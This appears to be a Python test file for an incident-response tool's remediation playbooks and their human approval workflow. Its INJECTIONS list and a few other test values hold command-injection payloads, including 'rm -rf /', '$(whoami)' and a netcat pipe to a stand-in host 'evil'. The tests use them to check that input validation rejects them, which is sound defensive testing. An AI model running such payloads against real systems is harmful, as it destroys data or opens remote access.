#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Remediation playbooks: rendering of every template, command injection
attempts, and the human approval flow (propose / decide / download)."""

import os
import shutil
import tempfile
import unittest


os.environ['PHOENIX_SECRET_KEY'] = 'test-secret-key-for-testing-only'
os.environ['PHOENIX_DEBUG'] = 'false'

import playbooks  # noqa: E402

VALID = {
    'firewall_block_iptables': {'ip': '203.0.113.9'},
    'firewall_block_nftables': {'ip': '2001:db8::/64', 'direction': 'inbound'},
    'firewall_block_windows': {'ip': '198.51.100.7', 'direction': 'outbound'},
    'firewall_block_csv': {'ip': '198.51.100.0/24', 'port': 443, 'protocol': 'tcp', 'ticket': 'INC-42'},
    'ad_disable_user': {'identity': 'jdoe'},
    'entra_revoke_sessions': {'upn': 'jdoe@contoso.com', 'disable_account': True},
    'aws_disable_access_key': {'aws_user': 'ci-bot', 'access_key_id': 'AKIAABCDEFGHIJKLMNOP'},
    'edr_isolate_host': {'api_url': 'https://edr.example.com/api/v1/isolate', 'agent_id': 'abc-123'},
    'windows_firewall_isolation': {'hostname': 'SRV-01', 'management_ip': '10.0.0.5'},
    'persistence_scheduled_task': {'hostname': 'SRV-01', 'task_name': 'Updater', 'task_path': '/Microsoft/'},
    'persistence_service': {'hostname': 'SRV-01', 'service_name': 'evilsvc', 'delete_service': True},
    'persistence_run_key': {'hostname': 'WS-1', 'value_name': 'OneDriveUpd', 'hive': 'HKCU'},
    'persistence_wmi_subscription': {'hostname': 'WS-1', 'subscription_name': 'SCM Event'},
    'persistence_cron': {'hostname': 'web1', 'linux_user': 'www-data', 'pattern': '/tmp/.x/miner'},
    'persistence_systemd_unit': {'hostname': 'web1', 'unit': 'kworkerd.service'},
    'persistence_authorized_keys': {
        'hostname': 'web1', 'linux_user': 'root',
        'key_blob': 'AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl'},
}

EXPECTED = {
    'firewall_block_iptables': ('iptables -I INPUT -s 203.0.113.9/32 -j DROP', 'iptables -D INPUT'),
    'firewall_block_nftables': ('nft add element inet phoenix_block blocked6', 'nft delete element'),
    'firewall_block_windows': ("-Direction Outbound -Action Block -RemoteAddress '198.51.100.7/32'",
                               'Remove-NetFirewallRule'),
    'firewall_block_csv': ('block,inbound,198.51.100.0/24,any,tcp,443', 'remove,inbound'),
    'ad_disable_user': ("Disable-ADAccount -Identity 'jdoe'", "Enable-ADAccount -Identity 'jdoe'"),
    'entra_revoke_sessions': ("Revoke-MgUserSignInSession -UserId 'jdoe@contoso.com'",
                              '-AccountEnabled:$true'),
    'aws_disable_access_key': ('--status Inactive', '--status Active'),
    'edr_isolate_host': ('"action": "isolate"', '"action": "unisolate"'),
    'windows_firewall_isolation': ("-RemoteAddress '10.0.0.5/32'", 'netsh advfirewall import'),
    'persistence_scheduled_task': ("Unregister-ScheduledTask -TaskName 'Updater' -TaskPath '\\Microsoft\\'",
                                   'Register-ScheduledTask'),
    'persistence_service': ("sc.exe delete 'evilsvc'", 'New-Service'),
    'persistence_run_key': ("Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
                            'reg.exe import'),
    'persistence_wmi_subscription': ('Remove-CimInstance', 'Import-Clixml'),
    'persistence_cron': ('grep -vF -- /tmp/.x/miner', 'crontab -u www-data'),
    'persistence_systemd_unit': ('systemctl mask kworkerd.service', 'systemctl unmask kworkerd.service'),
    'persistence_authorized_keys': ('grep -vF -- AAAAC3NzaC1lZDI1NTE5', 'cp -p'),
}

INJECTIONS = [
    '1.2.3.4; rm -rf /', '$(whoami)', '`id`', 'jdoe && calc.exe', 'jdoe | nc evil 4444',
    "jdoe' ; Invoke-Expression 'x", 'jdoe"', 'jdoe\nwhoami', 'a > /etc/passwd', 'jdoe\r\n',
    '${IFS}cat', 'x%COMSPEC%', 'jdoe\x00', 'jdoe@contoso.com;ls', '..\\..\\x',
]


class PlaybookRenderingTest(unittest.TestCase):

    def test_every_template_renders(self):
        self.assertEqual(set(VALID), set(playbooks.TEMPLATES))
        for tid, params in VALID.items():
            with self.subTest(template=tid):
                r = playbooks.render(tid, params)
                fragment, rollback_fragment = EXPECTED[tid]
                self.assertIn(fragment, r['script'])
                self.assertIn(rollback_fragment, r['rollback'])
                self.assertTrue(r['prechecks'].strip())
                self.assertFalse(r['executed_by_phoenix'])
                if r['language'] != 'csv':
                    self.assertIn('Phoenix NEVER executes this script', r['script'])
                    self.assertIn('---- Pre-checks ----', r['script'])

    def test_catalogue(self):
        items = playbooks.list_templates()
        self.assertEqual(len(items), 16)
        cats = {t['category'] for t in items}
        self.assertEqual(cats, {'firewall', 'account', 'isolation', 'persistence'})

    def test_injection_attempts_rejected_for_every_string_parameter(self):
        for tid, valid in VALID.items():
            spec = {p['name']: p for p in playbooks.TEMPLATES[tid]['params']}
            for name, value in valid.items():
                if spec[name]['type'] in ('bool', 'port'):
                    continue
                for payload in INJECTIONS:
                    bad = dict(valid, **{name: payload})
                    with self.subTest(template=tid, param=name, payload=payload):
                        with self.assertRaises(playbooks.PlaybookError) as ctx:
                            playbooks.render(tid, bad)
                        self.assertIn(name, ctx.exception.errors)

    def test_specific_validation(self):
        cases = [
            ('firewall_block_iptables', {'ip': '999.1.1.1'}),
            ('firewall_block_iptables', {'ip': '10.0.0.1', 'direction': 'sideways'}),
            ('firewall_block_csv', {'ip': '10.0.0.1', 'port': 70000}),
            ('aws_disable_access_key', {'aws_user': 'a', 'access_key_id': 'AKIA123'}),
            ('edr_isolate_host', {'api_url': 'http://edr.local/x', 'agent_id': 'a'}),
            ('edr_isolate_host', {'api_url': 'https://u:p@edr.local/x', 'agent_id': 'a'}),
            ('edr_isolate_host', {'api_url': 'https://edr.local/x?a=b', 'agent_id': 'a'}),
            ('persistence_systemd_unit', {'hostname': 'h', 'unit': 'evil'}),
            ('persistence_run_key', {'hostname': 'h', 'value_name': 'v', 'run_key': 'Winlogon'}),
            ('ad_disable_user', {}),
            ('ad_disable_user', {'identity': 'jdoe', 'extra': 'x'}),
            ('unknown_template', {}),
        ]
        for tid, params in cases:
            with self.subTest(template=tid, params=params):
                with self.assertRaises(playbooks.PlaybookError):
                    playbooks.render(tid, params)

    def test_quoting_helpers(self):
        self.assertEqual(playbooks.ps_quote("a'b"), "'a''b'")
        self.assertEqual(playbooks.sh_quote('a b'), "'a b'")
        self.assertEqual(playbooks.csv_field('a,"b"'), '"a,""b"""')


class PlaybookHitlApiTest(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.db_fd, cls.db_path = tempfile.mkstemp(suffix='.db')
        cls.store = tempfile.mkdtemp(prefix='phoenix_custody_')
        os.environ['PHOENIX_CUSTODY_DIR'] = cls.store
        import database
        database.DB_PATH = cls.db_path
        database.init_db()
        from app import app
        app.config['TESTING'] = True
        cls.app = app
        cls.client = app.test_client()
        from tests.auth_helpers import add_member, bootstrap_admin, create_user
        cls.admin = bootstrap_admin(cls.client, 'pb_admin', 'Playbook-Admin-2026!')['token']
        cls.analyst = create_user(cls.client, cls.admin, 'pb_analyst', 'Playbook-Analyst-2026!')['token']
        cls.viewer = create_user(cls.client, cls.admin, 'pb_viewer', 'Playbook-Viewer-2026!',
                                 role='viewer')['token']
        cls.outsider = create_user(cls.client, cls.admin, 'pb_out', 'Playbook-Outsider-2026!')['token']
        resp = cls.client.post('/api/investigations', json={'name': 'Playbook case'},
                               headers={'Authorization': f'Bearer {cls.analyst}'})
        cls.inv = resp.get_json()['id']
        add_member(cls.client, cls.analyst, cls.inv, 'pb_viewer')

    @classmethod
    def tearDownClass(cls):
        os.environ.pop('PHOENIX_CUSTODY_DIR', None)
        shutil.rmtree(cls.store, ignore_errors=True)
        os.close(cls.db_fd)
        os.unlink(cls.db_path)

    def _h(self, token):
        return {'Authorization': f'Bearer {token}'}

    def _propose(self, token, **extra):
        body = {'investigation_id': self.inv, 'template_id': 'firewall_block_iptables',
                'params': {'ip': '203.0.113.9'}, 'reason': 'C2 server'}
        body.update(extra)
        return self.client.post('/api/playbooks/propose', json=body, headers=self._h(token))

    def test_templates_and_preview(self):
        resp = self.client.get('/api/playbooks/templates', headers=self._h(self.viewer))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(len(resp.get_json()['items']), 16)
        prev = self.client.post('/api/playbooks/render', json={
            'template_id': 'ad_disable_user', 'params': {'identity': 'jdoe'}}, headers=self._h(self.viewer))
        self.assertEqual(prev.status_code, 200)
        self.assertIn('Disable-ADAccount', prev.get_json()['script'])
        bad = self.client.post('/api/playbooks/render', json={
            'template_id': 'ad_disable_user', 'params': {'identity': 'x;rm'}}, headers=self._h(self.viewer))
        self.assertEqual(bad.status_code, 400)
        self.assertIn('identity', bad.get_json()['fields'])

    def test_viewer_and_outsider_cannot_propose(self):
        self.assertEqual(self._propose(self.viewer).status_code, 403)
        self.assertEqual(self._propose(self.outsider).status_code, 404)

    def test_injection_rejected_at_propose(self):
        resp = self._propose(self.analyst, params={'ip': '1.2.3.4;reboot'})
        self.assertEqual(resp.status_code, 400)

    def test_full_hitl_flow(self):
        import custody
        resp = self._propose(self.analyst)
        self.assertEqual(resp.status_code, 201, resp.get_json())
        action = resp.get_json()
        self.assertEqual(action['status'], 'WAITING_APPROVAL')
        self.assertEqual(action['playbook_id'], 'firewall_block_iptables')
        self.assertEqual(action['playbook_params']['ip'], '203.0.113.9')
        self.assertEqual(action['script_sha256'], custody.sha256_text(action['script']))
        aid = action['id']

        # Sealed in the ledger with the script hash
        entries = custody.ledger_entries(self.inv)
        requested = [e for e in entries if e['action'] == 'remediation_requested'][-1]
        self.assertEqual(requested['details']['script_sha256'], action['script_sha256'])

        # Viewer sees it but cannot decide nor download before approval
        lst = self.client.get(f'/api/remediation?investigation_id={self.inv}', headers=self._h(self.viewer))
        self.assertIn(aid, [a['id'] for a in lst.get_json()['items']])
        self.assertEqual(self.client.post(f'/api/remediation/{aid}/decision', json={'decision': 'approve'},
                                          headers=self._h(self.viewer)).status_code, 403)
        self.assertEqual(self.client.post(f'/api/remediation/{aid}/decision', json={'decision': 'approve'},
                                          headers=self._h(self.outsider)).status_code, 404)
        self.assertEqual(self.client.get(f'/api/remediation/{aid}/script',
                                         headers=self._h(self.analyst)).status_code, 409)

        ok = self.client.post(f'/api/remediation/{aid}/decision',
                              json={'decision': 'approve', 'note': 'Go, change CHG-1'},
                              headers=self._h(self.analyst))
        self.assertEqual(ok.status_code, 200)
        self.assertEqual(ok.get_json()['status'], 'APPROVED')
        approved = [e for e in custody.ledger_entries(self.inv) if e['action'] == 'remediation_approved'][-1]
        self.assertEqual(approved['details']['script_sha256'], action['script_sha256'])

        again = self.client.post(f'/api/remediation/{aid}/decision', json={'decision': 'reject'},
                                 headers=self._h(self.analyst))
        self.assertEqual(again.status_code, 409)

        dl = self.client.get(f'/api/remediation/{aid}/script', headers=self._h(self.viewer))
        self.assertEqual(dl.status_code, 200)
        self.assertEqual(dl.get_data(as_text=True), action['script'])
        self.assertEqual(dl.headers['X-Phoenix-Script-SHA256'], action['script_sha256'])
        self.assertIn('attachment', dl.headers['Content-Disposition'])
        rb = self.client.get(f'/api/remediation/{aid}/script?part=rollback', headers=self._h(self.analyst))
        self.assertIn('iptables -D INPUT', rb.get_data(as_text=True))
        self.assertEqual(self.client.get(f'/api/remediation/{aid}/script?part=../x',
                                         headers=self._h(self.analyst)).status_code, 400)
        self.assertEqual(self.client.get(f'/api/remediation/{aid}/script',
                                         headers=self._h(self.outsider)).status_code, 404)
        self.assertTrue(custody.verify_chain()['valid'])

    def test_reject_flow(self):
        aid = self._propose(self.analyst, template_id='persistence_cron', params={
            'hostname': 'web1', 'linux_user': 'www-data', 'pattern': '/tmp/.x/miner'}).get_json()['id']
        resp = self.client.post(f'/api/remediation/{aid}/decision', json={'decision': 'reject', 'note': 'FP'},
                                headers=self._h(self.admin))
        self.assertEqual(resp.get_json()['status'], 'REJECTED')
        self.assertEqual(self.client.get(f'/api/remediation/{aid}/script',
                                         headers=self._h(self.admin)).status_code, 409)


if __name__ == '__main__':
    unittest.main()
